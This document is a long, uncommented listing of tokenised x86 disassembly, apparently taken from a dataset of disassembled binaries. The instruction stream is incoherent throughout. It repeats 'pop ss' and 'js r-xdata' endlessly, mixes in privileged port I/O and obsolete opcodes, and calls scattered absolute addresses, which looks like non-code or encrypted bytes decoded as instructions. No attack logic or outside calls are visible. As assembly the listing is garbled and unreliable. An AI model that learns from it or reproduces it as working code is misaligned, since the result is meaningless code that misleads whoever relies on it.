js r-xdata
call 0x78be7bd5
call 0x22a2f51
js r-xdata
out 0x6c eax
sub [ ecx ] al
lahf
pop ss
pop ss
pop ss
js r-xdata
js r-xdata
lodsd [ esi ]
js r-xdata
adc eax 0x117173e
jle r-xdata
js r-xdata
js r-xdata
out 0x6c eax
mov fs [ ecx - 0x6b ]
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
mov ebx 0x545863be
call 0xfffffffffe47f002
daa
pop ss
pop ss
js r-xdata
das
lodsd [ esi ]
adc al 0xe9
arpl [ ecx + edi * 4 ] ax
add edi edx
js r-xdata
js r-xdata
js r-xdata
call 0xffffffffea328577
call 0xfffffffffcff067c
call 0x78be7d81
sti
js r-xdata
int1
js r-xdata
arpl [ esi + 0x54 ] bp
add [ eax + 0x78e8e8fb ] ebp
js r-xdata
js r-xdata
sub al 0xe4
js r-xdata
call 0x1dd108ee
pop ss
pop ss
js r-xdata
sbb bh ah
js r-xdata
mov al 0x37
mov eax 0xec82bbbb
add [ edi - 0x10 ] ebp
call 0x78be7d12
mov ecx 0x1e0a563
js r-xdata
imul eax [ eax + esi * 8 ] 0xbbe8e8eb
add [ edx + 0x7817173b ] ebp
js r-xdata
pop ss
adc [ edi ] dl
out dx al
pushad
in al dx
rcr ebx 0x1
cmp ah [ ebx + 0x29 ]
add [ 0x78e8e8e5 ] eax
js r-xdata
pop ss
imul edx [ ebp - 0x59fe13ec ] 0x37
pop ss
pop ss
js r-xdata
sub [ ecx ] ah
sub edi [ eax + 0x78 ]
js r-xdata
sbb [ ebx + 0x38 ] ah
mov fs [ ecx - 0x43 ]
xchg ebp eax
js r-xdata
jmp 0x4a9f178
js r-xdata
pop ss
add [ ebx + 0x16 ] eax
js r-xdata
js r-xdata
js r-xdata
in al dx
add [ esi + 0x78171737 ] esp
js r-xdata
pop ss
js r-xdata
add ecx eax
push ss
pop ss
js r-xdata
add [ esp + edi + 0x17 ] al
js r-xdata
js r-xdata
js r-xdata
sub bh ah
insd
mov bl 0xfb
aas
pop ss
pop ss
mov cl 0x6d
sub bh ah
insd
test al 0xa
pop ss
pop ss
add [ edx + 0xc ] ebp
pop ss
pop ss
js r-xdata
or edx [ edi ]
js r-xdata
call 0x78be7c61
sti
js r-xdata
js r-xdata
push 0xffffffdb
out dx al
js r-xdata
js r-xdata
js r-xdata
stc
js r-xdata
xchg ecx eax
js r-xdata
js r-xdata
arpl [ ebx ] ax
lodsd [ esi ]
loopne r-xdata
add al 0x63
js r-xdata
out 0x6d eax
js r-xdata
pop ss
pop ss
xchg ebp eax
insd
pop ss
pop ss
js r-xdata
call 0xffffffffb0470cf5
aaa
js r-xdata
pop ss
pop ss
inc ebx
push ss
js r-xdata
pop ss
popad
call 0x78be80a6
arpl [ ebp - 0xf90feec ] bp
js r-xdata
js r-xdata
js r-xdata
insb
fpatan
call 0xffffffffa0e9694a
mov ecx 0xb0a363
call 0xffffffffc912afb8
insd
sub bh ah
js r-xdata
js r-xdata
sub al 0xd8
call 0xffffffffb8e419da
add [ ebp + 0x14 ] esp
pop ss
pop ss
js r-xdata
js r-xdata
mov eax 0x9d171782
add al 0x1
and dl ah
call 0x78be7d17
js r-xdata
call 0x78be7bf2
js r-xdata
stc
js r-xdata
call sub_4608d8
push 0x171715
sbb eax 0x6517173b
lodsd [ esi ]
or al 0xb8
lodsd [ gs : esi ]
pushad
mov eax 0xec82bbbb
mov ebx 0x173af501
and [ ebp + 0x6d ] ah
pop ss
js r-xdata
js r-xdata
call 0xffffffff9b468219
js r-xdata
call 0x78be812b
popad
xchg ebp eax
pop ss
add esi edx
call 0x1ae109aa
pop ss
fisub [ esi ]
out 0x6d eax
sbb eax 0x78781717
js r-xdata
xchg ebp eax
adc al 0xeb
add ebp ecx
js r-xdata
stosb [ edi ]
cmp edx [ edi ]
js r-xdata
and dl [ edi ]
js r-xdata
add al 0x1
adc al 0x1
js r-xdata
outsd
push ss
pop ss
out 0x6c eax
popad
xchg ebp eax
pop edx
add [ edx + 0x78171730 ] esi
js r-xdata
lodsb [ esi ]
js r-xdata
js r-xdata
js r-xdata
add [ ebx - 0x4155551e ] 0x1
mov esp 0xe7e8e8c9
js r-xdata
js r-xdata
mov ebp 0x46b0463
js r-xdata
jmp r-xdata
call 0x78be7b66
in al 0x1
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ ebp + 0xb ] esi
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sbb dl [ edi ]
fwait
pop ss
js r-xdata
inc esp
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
jmp r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
add [ ebp + 0x1e ] esi
js r-xdata
pop ss
js r-xdata
js r-xdata
outsd
js r-xdata
mov ebx 0x109001bb
pop ss
js r-xdata
or eax 0x6be8e8f9
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
add [ edi ] dl
pop ss
cmp [ edi ] dl
test al 0xfb
js r-xdata
or al 0x8e
js r-xdata
cmp [ eax ] edi
js r-xdata
pop ss
js r-xdata
add [ ecx ] edi
js r-xdata
call 0x78be819a
lea edx [ eax + ebp * 8 ]
aam 0x63
adc [ ebx + 0x39 ] esp
add [ ebx ] edi
movsd [ edi ] gs : [ esi ]
adc al 0xb9
insb
cld
adc eax 0x8d6b1717
adc al 0xe8
pop edi
sub al 0xe8
call 0x39d80b3c
pop ss
js r-xdata
popad
lodsd [ esi ]
mov al 0x82
xchg [ esi + 0x1f4ad61 ] cl
shr ecx cl
add [ edi - 0x8 ] esi
js r-xdata
stc
call 0x14fb6b24
add [ esi - 0x1d ] ch
call 0xffffffffe472752c
mov ebx 0xbf17ea82
add [ ebx + 0x117171a ] bl
salc
js r-xdata
in al 0x63
js r-xdata
arpl [ edi ] bp
add [ esi + esi * 8 - 0x18 ] bh
call 0x2f1d0a7e
pop ss
js r-xdata
xlat
pop ss
js r-xdata
jne r-xdata
add [ edx - 0x2 ] edi
call 0xffffffff82f681cb
test [ esi - 0x4f0d529f ] ecx
add [ esi - 0xb529e72 ] 0x1
insb
loopne r-xdata
add edx [ edi ]
pop ss
int 0x3
js r-xdata
add ecx esp
js r-xdata
pop ss
push ds
js r-xdata
js r-xdata
js r-xdata
js r-xdata
push ss
pop ss
pop ss
add [ edx - 0xc ] ebp
add [ eax + 0x171710 ] edx
push cs
js r-xdata
call 0xffffffffe4726ecd
js r-xdata
push esp
sbb eax 0xb11717
mov al 0x0
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
popad
mov ebp 0xb23163aa
mov fs [ ecx - 0x4b ]
push cs
js r-xdata
pop ss
js r-xdata
cmp [ edi ] dl
js r-xdata
add [ esi ] edx
call 0xffffffff8ebe82da
popad
pop ss
imul ebp [ esp + edi * 8 ] 0x1
pop ss
call 0xffffffff9246f33b
cmp [ edi ] edx
shl [ ebp + 0x263d01e4 ] 0x1
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
mov gs [ ebp + 0x3a ]
add [ ebx + 0x78171715 ] esi
js r-xdata
pop ss
insb
jecxz r-xdata
out 0x6c eax
xor [ ecx ] al
js r-xdata
call 0x182e8b53
jle r-xdata
pop ss
js r-xdata
sbb al 0x17
pop ss
js r-xdata
out 0x6c eax
aad 0x36
pop ss
pop ss
fld [ eax ]
test al 0x1
jae r-xdata
pop ss
lodsd [ gs : esi ]
sbb [ ecx ] al
xor esi 0xffffffe8
call 0x722d316d
sub [ ecx ] eax
pop ebp
out 0xe8 al
call 0x28b38182
add eax edi
or dl [ edi ]
pop ss
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sub [ eax + 0x17344901 ] ch
pop ss
js r-xdata
adc ecx edi
imul ebp [ esp ] 0x1
js r-xdata
imul edx [ edi ] 0xffffffc5
mov bh 0xb3
add [ ebp + 0x78e8e8eb ] eax
add [ ebp ] esp
pop ss
js r-xdata
js r-xdata
sub bl 0x1
add [ edi + 0x1f ] ebp
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
add [ edi + 0x78e8e8f9 ] edi
js r-xdata
stosb [ edi ]
arpl [ ecx ] si
mov dl 0x8e
popad
mov ch 0xe
js r-xdata
mov fs [ ecx - 0x6b ]
adc al 0xb7
sub [ edx - 0x171c6eff ] 0xe8
fist [ edi ]
popad
lodsd [ esi ]
push ds
add edi edx
aas
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
xchg ebp eax
sbb cl [ esi + 0x63d6bd61 ]
adc [ ebx + 0x38 ] ah
mov fs [ ecx - 0x4b ]
or cl [ esi - 0x24e36a9f ]
pop ss
mov fs [ ecx - 0x43 ]
test al 0x63
xor bl bl
cmp al [ edx - 0x4a9e7161 ]
loope r-xdata
cld
add [ edi ] edx
mov fs [ ecx - 0x53 ]
cmp al 0xb0
js r-xdata
js r-xdata
mov fs [ ecx - 0x53 ]
pushfd
js r-xdata
add [ edx - 0x7 ] eax
call 0xffffffffb95aae0f
call 0x4e320aa
sti
adc eax 0x78781717
js r-xdata
js r-xdata
call r--data
js r-xdata
js r-xdata
pop ss
js r-xdata
call 0xffffffff944a715b
in al dx
call 0xcd37361
call 0xfffffffff7d40939
call 0xffffffffc4306b6b
jmp 0x78be7fb3
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x78be811a
js r-xdata
push 0xfffffff4
in al 0x1
js r-xdata
pop ss
js r-xdata
push ss
add eax esi
sbb [ edi ] edx
sbb eax 0x78e8e8ff
imul ebp [ eax ] 0xfffffffc
popad
lodsd [ esi ]
adc [ ecx ] al

arpl [ ecx + eax ] ax
mov ah 0xb
js r-xdata
add [ ecx ] ch
lodsd [ esi ]
adc al 0x50
call 0xffffffffe82ef481
dec edx
add [ ecx + 0x2d ] esi
pop ss
pop ss
js r-xdata
xor al 0xb0
sbb [ esi + 0x618e1063 ] 0x95
arpl [ ss : esi ] dx
mov fs [ ecx - 0x6b ]
or bl bl
pop ss
add edi edi
cmp [ edi ] dl
pop ss
js r-xdata
insb
xor al 0xe4
call 0x31770d24
pop ss
pop ss
js r-xdata
xor ah [ ebx + 0x2e ]
mov fs [ ecx - 0x53 ]
lodsd [ esi ]
mov cl 0x6d
sub bh ah
insb
mov ebp edi
call 0xfc50c90
pop ss
pop ss
out 0x6d eax
in eax 0x32
pop ss
pop ss
xchg ebp eax
push eax
pop eax
xor [ edx + 0xeb5618e ] esi
js r-xdata
lodsd [ esi ]
add al 0xa5
js r-xdata
cld
call 0x78be82a9
js r-xdata
add [ 0x6be8e8e2 ] ch
sub al 0xe4
adc [ edx - 0x71e99c42 ] al
popad
xchg ebp eax
adc bl bl
pop ss
mov fs [ ecx - 0x6b ]
fld [ eax ]
popad
lodsd [ esi ]
add [ edi + 0x1b ] esp
pop ss
pop ss
pop ss
js r-xdata
jecxz r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
adc al 0xe4
call 0x1f5f0937
pop ss
insb
js r-xdata
pop ss
js r-xdata
mov eax 0x173b7101
js r-xdata
and eax esp
call 0x78be84a7
js r-xdata
insb
int3
jbe r-xdata
out 0x66 eax
jmp r-xdata
js r-xdata
adc eax 0x42001717
js r-xdata
mov [ 0xffffffffad2fa5be ] eax
movsd [ edi ] [ esi ]
js r-xdata
js r-xdata
js r-xdata
xor [ eax - 0x66fe7a7e ] dh
lodsd [ esi ]
js r-xdata
lodsd [ esi ]
jl r-xdata
js r-xdata
js r-xdata
sbb al 0x1
xchg [ edi + edx ] dl
pop ss
js r-xdata
add [ 0x65171736 ] cl
xchg ebp eax
add [ ecx + 0x78e8e8e3 ] edx
imul ecx [ ebp - 0x5a9a17ec ] 0x14
mov ecx 0xe8f94201
add al 0xf0
jmp r-xdata
js r-xdata
pop ss
js r-xdata
js r-xdata
jno r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
sbb [ esi + ecx * 4 - 0x4ffb529f ] 0x82
or [ esi - 0x4ff9529f ] 0xbe018e82
xor [ edi ] edx
pop ss
js r-xdata
call 0xffffffffb046f445
add [ edi ] dl
pop ss
xor [ edx - 0x40fa48f9 ] 0x61
scasb [ edi ]
adc eax 0x7c001717
cmp [ edi ] dl
pop ss
add [ edi - 0x1 ] ebp
call 0x78be83c4
js r-xdata
pop eax
xor eax 0x78781717
js r-xdata
cdq
pop ss
insd
sub bh ah
insd
pop ds
xor [ edi ] edx
pop ss
xchg ebp eax
add [ ebp + 0x65 ] ah
pop eax
pop ss
js r-xdata
movsd [ edi ] [ esi ]
mov al 0x8d
das
mov esi 0x3cad2fa5
mov al 0x8d
xchg [ esi - 0x5acf52d1 ] bh
js r-xdata
pop eax
js r-xdata
pop ss
js r-xdata
insd
xor ebp eax
call 0x7cf36fb5
mov al 0x82
js r-xdata
pop ss
js r-xdata
or edx [ edi ]
jne r-xdata
add [ esi ] cl
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sbb edx [ edi ]
pop ss
add esp ebp
pop ss
pop ss
js r-xdata
pop ss
add [ edi ] edi
js r-xdata
movhps [ edi ] xmm2
mov esi 0x17097d01
pop ss
pop ss
mov edi 0x17106b8c
out 0x6c eax
0x1e8e8e0 0x2452
sar [ eax - 0x18171753 ] 0x1
js r-xdata
call 0xffffffff80fef431
in al dx
jmp 0x4347f437
js r-xdata
pushfd
mov fs [ ecx - 0x53 ]
add al 0xb0
add [ ecx + 0x6ad618e ] 0xb0
or [ esi + 0x1731be01 ] 0x17
js r-xdata
cmp [ edi ] dl
inc edx
js r-xdata
cmp al 0xb0
lea eax [ esi + 0x30ad2fbe ]
movsd [ edi ] [ esi ]
das
lodsd [ esi ]
js r-xdata
pop ss
js r-xdata
lodsd [ esi ]
xor al 0x86
mov esi 0x5900a5a5
add [ edi ] edx
pop ss
mov bh 0xb6
add [ ebp + 0x78171703 ] ebp
js r-xdata
lea ebp [ edi ]
js r-xdata
test [ ecx ] eax
js r-xdata
pop ss
or al 0xfc
mov [ 0x1d5400b0 ] eax
pop ss
js r-xdata
js r-xdata
mov esi 0x61bbd858
js r-xdata
js r-xdata
js r-xdata
js r-xdata
imul ebp [ eax + edx * 8 ] 0x1
js r-xdata
js r-xdata
pop ss
pop ss
lodsd [ esi ]
loopne r-xdata
add dl [ edi ]
aas
js r-xdata
mov eax 0x1700a200
pop ss
and [ ebp + 0x1baf7fa ] 0xa4
add edx [ edi ]
pop ss
js r-xdata
popad
movsd [ edi ] [ esi ]
sbb dh [ ecx + 0x618ec682 ]
movsd [ edi ] [ esi ]
sbb al 0xb1
add [ esi ] ecx
0xbe84d5
jb r-xdata
movhps [ edi ] xmm2
js r-xdata
pop ss
xor [ edi ] edx
pop ss
js r-xdata
mov al 0x1
push ss
call 0x78be8249
js r-xdata
mov ebx 0x1b8bf17
adc al 0x17
add [ edx + 0x38 ] al
js r-xdata
insd
cmp al [ ecx ]
mov bl 0x15
pop ss
pop ss
js r-xdata
insb
mov edx 0xe717173e
pop edi
0x17172401 0x7817
pop ss
mov cl 0x0
add [ ebp + ebx + 0x17 ] dl
mov eax 0xe8e48a01
call 0x78be7b70
js r-xdata
js r-xdata
call 0xffffffffadabf6a9
sub [ eax + 0x15b46d65 ] bh
call 0xf390e83
fdivr [ ebx - 0x17fb919f ]
js r-xdata
js r-xdata
pop eax
js r-xdata
js r-xdata
js r-xdata
pop ss
lodsd [ esi ]
sub [ eax - 0x17ff80e9 ] bh
js r-xdata
sbb edx [ edi ]
pop ss
js r-xdata
in eax 0x1b
pop ss
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
mov cl 0xb1
movsd [ edi ] gs : [ esi ]
xor [ ecx - 0x3fe577e ] bh
pop ss
pop ss
mov eax 0x170f2900
pop ss
popad
mov ch 0x30
pop ss
popfd
sbb [ edi + 0x173ce900 ] bh
pop ss
sbb [ esi + ecx * 4 - 0x24c1529f ] 0x28
js r-xdata
pop ss
lds esi [ edi - 0x147afe4d ]
call 0x65477b6c
loopne r-xdata
adc edx ebx
out 0x6d eax
das
pop ds
pop ss
pop ss
arpl [ eax - 0x1801fe20 ] sp
call 0x6a47bee2
pop ss
pop ss
pop ss
jle r-xdata
outsb
popad
js r-xdata
mov bl 0x2b
js r-xdata
mov ebx 0xe8046e61
js r-xdata
js r-xdata
out dx al
call 0x78be849a
mov eax [ 0x78e8e8ee ]
js r-xdata
call 0x28f373aa
mov eax 0x15b46d65
mov eax 0xe8007f17
mov bl 0x8e
popad
mov ch 0x16
add [ ebp - 0x4a9e714d ] 0xe8
add [ esi + 0x618e3263 ] 0xb5
0xb5618eb3 0x82ec
mov ch 0xea
mov bl 0x8e
popad
mov ch 0xec
sbb dh 0xb3
add ecx ecx
daa
pop ss
pop ss
js r-xdata
arpl [ eax - 0x1b579c1c ] bp
arpl ax bp
arpl ax bp
arpl [ eax - 0x33139e10 ] bp
arpl sp bp
int3
insd
sub bh ah
insb
js r-xdata
js r-xdata
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
jecxz r-xdata
mov eax 0xe7286dcc
insb
inc edx
jmp r-xdata
arpl [ ebp - 0x3347e820 ] bp
insd
sub bh ah
call 0x28b3f6ed
add ebp edx
or [ edi ] edx
pop ss
js r-xdata
add al 0xe8
js r-xdata
pop ss
js r-xdata
js r-xdata
insd
sub edi [ eax + 0x78 ]
pop ss
popfd
or [ ecx ] al
cmp eax 0x78781717
js r-xdata
out dx al
pop es
pop ss
pop ss
add [ ecx ] esp
push ds
pop ss
pop ss
js r-xdata
insb
js r-xdata
lea ecx [ edx ]
out 0x6c eax
js r-xdata
jg r-xdata
pop ss
js r-xdata
pop ss
insb
xlat
xor edx [ edi ]
pop ss
add [ edx ] edi
das
pop ss
js r-xdata
sbb edx [ edi ]
sbb edx [ bx ]
lodsd [ gs : esi ]
pop ss
pop ss
js r-xdata
js r-xdata
push esp
mov eax 0xe8f92401
call 0x7c47b71c
add dl [ edi ]
mov cl 0x6d
sub bh ah
insd
or eax 0x65e8e8f9
lodsd [ esi ]
js r-xdata
js r-xdata
call 0x4247f611
or [ edi ] dl
js r-xdata
pop ss
pop ss
or dh 0x8b
cmp [ edi - 0x45 ] 0x61
outsb
add al ch
call 0xf280e94
pop ss
pop ss
add [ esi + 0x78171737 ] edi
mov eax 0xb828ad65
pop ss
jg r-xdata
call 0xfffffffff346f682
push cs
js r-xdata
pop ss
mov eax 0x65e09d17
lodsd [ esi ]
cmp al 0x1
xchg esi eax
add eax 0x3c011717
sub eax 0x6ce71717
xor [ ebp + 0x33 ] ch
out 0x6c eax
dec esp
aaa
pop ss
pop ss
add bh 0xb1
or eax 0x7661bb76
cmp al ch
call 0xf170e65
pop ss
pop ss
sbb [ ecx - 0x4427a742 ] 0x61
out dx al
add ah al
push cs
pop ss
pop ss
add [ ebx - 0x4427a742 ] 0x61
js r-xdata
jo r-xdata
js r-xdata
or ebx [ ebx ]
js r-xdata
jg r-xdata
js r-xdata
pop ss
js r-xdata
lodsd [ gs : esi ]
dec eax
mov eax 0x64002e63
adc [ edi ] dl
pop ss
add al 0xe4
add [ eax + ebx + 0x17 ] ebp
pop ss
js r-xdata
js r-xdata
add [ 0x7817173a ] edi
popfd
pop ss
pop ss
stosd [ edi ]
imul ebp [ edi ] 0xe8e8e86c
add [ esi ] ebx
or [ edi ] edx
pop ss
js r-xdata
mov edx 0x117171b
in al dx
out 0x6c eax
mov dh 0x1b
pop ss
pop ss
imul edx eax 0xe8e8adb8
out 0x6d eax
sub [ esi + 0x171bf701 ] dh
pop ss
pop ss
fistp [ esi ]
shr [ ebx ] cl
out 0x6e eax
and eax 0x1171711
cmp eax 0x7817173a
call 0x14880f12
js r-xdata
jno r-xdata
sub bh ah
insb
retn 0x171e
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x7871f7d8
js r-xdata
js r-xdata
popad
mov ch 0x14
add [ edi ] edx
pop ss
js r-xdata
insb
in al dx
call 0x17fef7b5
mov esi 0x3f0f01e0
pop ss
pop ss
js r-xdata
stosd [ edi ]
clc
insd
sub bh ah
insd
js r-xdata
js r-xdata
pop ss
add [ edx + 0x14 ] eax
js r-xdata
sub al 0x68
call 0x2c5111a5
pop ss
arpl [ ecx ] bp
and [ ebx ] ebp
js r-xdata
arpl [ eax ] sp
add dh 0x1
test [ edi ] esp
insb
int3
0x117170b 0x273f
pop ss
pop ss
js r-xdata
and [ edx + 0x278501c6 ] al
js r-xdata
js r-xdata
call 0x78be871d
js r-xdata
js r-xdata
js r-xdata
pop ss
adc al 0x1
js r-xdata
add [ ecx + edi * 8 ] esp
js r-xdata
call 0x175a4f2c
js r-xdata
pop ss
insb
js r-xdata
in al dx
fild [ eax + 0x6314b563 ]
jmp r-xdata
adc eax 0x618e1717
js r-xdata
sub edi [ eax + 0x78 ]
pop ss
mov edi 0x1b0b01bf
pop ss
js r-xdata
call 0xffffffffe8c6f867
jmp 0xffffffffcc47f86c
popad
js r-xdata
js r-xdata
jle r-xdata
mov eax 0x170c9d17
mov edi 0xe06601f4
call 0xffffffffe0e373eb
mov eax 0x40a5618e
jg r-xdata
js r-xdata
push edi
add [ edi ] dl
js r-xdata
js r-xdata
pop ss
pop ss
call 0x1ee9181
jl r-xdata
stc
mov fs [ ecx - 0x5b ]
sbb [ eax ] al
dec ebx
out dx al
call 0x65f2910f
insd
mov [ edi ] ss
pop ss
pop ss
mov esi 0xfe7501b8
call 0x78be871e
js r-xdata
adc al 0x17
inc edx
ror [ esi ] 0x1
pop ss
out 0x6c eax
pop ss
lodsd [ esi ]
adc al 0xb9
mov esi 0x15646565
pop ss
mov fs [ ecx - 0x5b ]
inc eax
fadd [ edi ]
popad
mov ch 0x48
mov fs [ ecx - 0x43 ]
dec esp
add [ eax ] dh
push edi
pop ss
pop ss
xchg ebp eax
adc eax 0x618e1717
js r-xdata
pop ss
pop ss
sub al 0x17
jle r-xdata
add [ edx + 0x117170b ] bl
aas
daa
js r-xdata
js r-xdata
js r-xdata
call 0x6e2d88c4
call 0x1fef8cc
and edi [ eax ]
js r-xdata
sub al 0x2f
lodsd [ esi ]
sbb eax 0xe882e882
mov gs [ edi ]
lodsd [ esi ]
adc [ edi ] edx
cmp [ ecx - 0x4b ] ah
test al 0xe0
popad
lodsd [ esi ]
adc al 0x1
cld
pop ss
js r-xdata
mov cl 0x1
mov bh 0x38
pop ss
pop ss
js r-xdata
js r-xdata
fidiv [ eax ]
js r-xdata
pop ss
mov fs [ ecx - 0x6b ]
js r-xdata
insd
pop esp
adc [ edi ] dl
pop ss
add eax edi
xor al 0x17
pop ss
js r-xdata
mov ch 0x1c
mov edi 0x17386600
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sub [ ecx ] al
pop ss
js r-xdata
add [ ebx ] esp
pop ss
pop ss
js r-xdata
js r-xdata
popad
mov ch 0xa6
js r-xdata
pop ss
call 0x3869119e
imul ebp [ eax + edi * 8 ] 0x6b
xchg esp eax
int3
js r-xdata
js r-xdata
mov fs [ ecx - 0x54 ]
int3
xor al 0xe8
call 0x204cd0d
sbb [ eax ] cl
test al 0x1
mov ecx 0x78e8e8e6
js r-xdata
pop ss
js r-xdata
popad
js r-xdata
pop ss
mov ebx 0xb804ad65
add [ ebx + 0x16 ] esi
pop ss
pop ss
pushfd
int3
jle r-xdata
mov fs [ ecx - 0x4b ]
mov eax 0x36639a82
add [ ecx + 0xf ] edi
xor [ esi + 0x63a4b561 ] cl
xor [ esi + 0x63a6b561 ] ecx
sub bh ah
js r-xdata
arpl [ edi ] si
cmpsb [ esi ] [ edi ]
js r-xdata
clc
imul edx [ esp + ecx * 8 + 0x6de7e9fc ] 0x5c
add edx [ edi ]
arpl [ ebp + 0x30710114 ] bp
pop ss
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
sub [ edi ] dl
pop ss
js r-xdata
popad
lodsd [ esi ]
or [ ecx ] al
or dl [ edi ]
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x177cdb87
pop ss
insd
sub bh ah
pop ss
pop ss
js r-xdata
insd
fadd [ edi ]
pop ss
pop ss
pop ss
pop ss
js r-xdata
call 0x1e47f9ac
push edi
pop ss
pop ss
js r-xdata
insb
js r-xdata
aaa
js r-xdata
pop ss
js r-xdata
push 0xb8e8e8e8
js r-xdata
cwde
add ebp ebp
or dl [ edi ]
pop ss
mov eax [ 0x1ca5eb10 ]
add [ edi + 0x1717173f ] ecx
jle r-xdata
add [ ecx + 0xc ] al
pop ss
js r-xdata
js r-xdata
out 0x34 eax
pop ss
pop ss
arpl [ ebp + 0x782bb5e0 ] bp
js r-xdata
mov dl 0x1
sbb esp esi
call 0xffffffffe7be8933
mov fs [ ecx - 0x43 ]
js r-xdata
out 0xe8 al
popfd
in al 0x63
lodsd [ esi ]
loopne r-xdata
out 0x6d eax
cwde
adc al 0x63
loopne r-xdata
call 0x1801f9df
jle r-xdata
add [ edi + 0x78171715 ] ecx
js r-xdata
pop ss
pop ss
js r-xdata
popad
mov ch 0xb8
sbb [ edx + 0x79013663 ] 0xf
jmp r-xdata
arpl [ ebx - 0x18d79208 ] bp
js r-xdata
cmp [ edi ] dl
call 0x2347c8cd
js r-xdata
mov eax 0x17bc9e17
js r-xdata
inc esp
call 0xffffffff9617fae8
adc al 0x1
add dl [ edi ]
pop ss
mov esi 0x17250b00
pop ss
mov cl 0x6d
insd
sub [ edi + 0x72bd618e ] 0xb2
jb r-xdata
pop ss
or esp [ 0x6db11717 ]
sbb [ ebp + 0x74bd618e ] 0xb2
mov ebp 0x9d82b272
mov fs [ ecx - 0x43 ]
je r-xdata
js r-xdata
insd
mov eax 0x6b21db8c
adc [ edi ] dl
add esi ebp
pop es
push edi
mov fs [ ecx - 0x43 ]
jbe r-xdata
call 0x17c6f9e6
call 0xffffffffbf01f9eb
add [ edi - 0x15 ] dl
call 0xffffffffe4727cf3
add [ ebx ] edi
sub dl [ edi ]
pop ss
js r-xdata
call 0xffffffffe85d91e7
js r-xdata
fld [ eax ]
add eax ebx
pop es
pop ss
or al 0x17
insb
adc edx [ edi ]
pop ss
mov eax 0x17e0ad63
insd
mov eax 0x17382301
mov fs [ ecx - 0x43 ]
mov ah 0x82
xor [ edx + 0x618e8682 ] 0x82b2b6bd
mov [ esi + 0x188bd61 ] cs
popfd
adc al 0x17
popfd
or al 0x17
mov edi 0xf3601f4
pop ss
pop ss
js r-xdata
sahf
mov esp 0x17e09d17
sub al 0x17
jle r-xdata
mov ebp 0x17267601
js r-xdata
pop ss
pop ss
add [ esi + 0x28 ] ecx
pop ss
pop ss
js r-xdata
sub [ esi + 0x782b21b3 ] dh
js r-xdata
popad
lodsd [ esi ]
inc edx
arpl [ esi ] di
out 0x6c eax
js r-xdata
js r-xdata
call 0x104ccec
push edi
jmp r-xdata
adc [ edi ] 0xe8
pop ss
insd
and [ 0xffffffffde011717 ] dl
xor [ edi ] dl
mov edi 0xdb05ad61
xor esp [ ebp - 0x53 ]
adc al 0xb8
mov ebx 0x4ad65bb
mov eax 0x17167301
pop ss
mov esi 0xe7286da4
js r-xdata
js r-xdata
call 0x2bc6fb4d
call 0xffffffffe8c8fb52
mov esi 0xe8eabf00
call 0xffffffffd22a3edf
xchg ebx eax
aam 0xe7
call 0x17609fa9
js r-xdata
sbb al 0x38
pop ss
pop ss
js r-xdata
popad
mov ebp 0x8c82b2b6
mov fs [ ecx - 0x43 ]
mov [ ecx ] al
adc [ gs : 0x1a011717 ] dl
pop ss
add [ 0x78171714 ] ecx
js r-xdata
pop ss
test al 0x6c
out dx eax
call 0xffffffffe7be8aca
insb
pop esp
js r-xdata
fld [ eax ]
add [ edi + 0x6317170c ] eax
xor [ edx - 0x4a9e7175 ] eax
inc esp
mov bl 0x8e
popad
mov ch 0x46
mov edi 0x170d0901
pop ss
js r-xdata
rcr [ ebx ] cl
out 0x6c eax
mov cl 0x3e
pop ss
pop ss
pop ss
pop edi
popfd
or al 0x17
mov edi 0x68e880f4
call 0x167215dd
pop ss
pushad
pop eax
call 0x4047fc76
out dx al
call 0xffffffffb1be8c7c
insd
sub bh ah
insb
in al dx
call 0x17fefc86
mov esi 0xa8936be0
insb
insd
sub bh ah
js r-xdata
adc al 0x17
pop ss
insd
adc al 0x1
js r-xdata
pop ss
mov [ edx ] ds
js r-xdata
pop ss
js r-xdata
call 0x14fb7506
js r-xdata
js r-xdata
js r-xdata
inc esp
push ds
pop ss
pop ss
add [ eax + 0x20 ] dl
pop ss
pop ss
arpl [ eax ] sp
add esp esi
xor [ edi ] edx
pop ss
sub dl 0x1
std
insd
mov ah 0xfd
dec edi
imul edx [ esi ] 0xffffffc8
out 0x6a eax
add eax 0x1171727
cdq
sti
call 0x12b5f962
sbb [ edi ] dl
pop ss
add [ ebx + 0x2f ] ebp
pop ss
pop ss
mov fs [ ecx - 0x20 ]
sub edi [ eax + 0x78 ]
js r-xdata
and [ ebx ] ebp
js r-xdata
js r-xdata
call 0x2bfdfd5e
js r-xdata
js r-xdata
mov [ 0x65171713 ] eax
scasd [ edi ]
out 0x6c eax
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x25b1496
pop ss
js r-xdata
js r-xdata
mov [ edi + edx ] esi
js r-xdata
pop ss
js r-xdata
arpl [ ebp - 0x23512ccc ] bp
add [ ecx + 0x1c ] eax
pop ss
popad
mov ch 0x14
js r-xdata
js r-xdata
and eax 0x78171733
js r-xdata
push edi
js r-xdata
sbb [ ebx - 0x17137bff ] 0xe8
js r-xdata
mov ecx [ esi - 0x4cbb4a9f ]
mov fs [ ecx - 0x4b ]
inc esi
pop ss
jle r-xdata
or al 0x17
js r-xdata
call 0x78be402f
js r-xdata
js r-xdata
js r-xdata
pop ss
sar [ eax - 0x14911848 ] cl
call 0xffffffffb5a7fc05
add [ esi + 0x26 ] esi
